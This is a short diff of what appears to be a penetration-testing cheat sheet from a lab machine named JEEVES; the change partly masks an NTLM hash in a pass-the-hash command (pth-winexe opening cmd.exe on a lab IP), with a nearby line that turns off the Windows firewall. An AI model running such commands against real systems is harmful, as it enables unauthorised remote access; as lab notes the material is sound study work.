@@ -19,7 +19,7 @@ NetSh Advfirewall set allprofiles state off
 
 #### Pass the hash
 ````
-pth-winexe -U JEEVES/administrator%aad3b435b51404eeaad3b435b51404ee:e0fb1fb85756c24235ff238cb
+pth-winexe -U JEEVES/administrator%aad3b43XXXXXXXX35b51404ee:e0fb1fb857XXXXXXXX238cb
 e81fe00 //10.129.26.210 cmd.exe
 
 ````
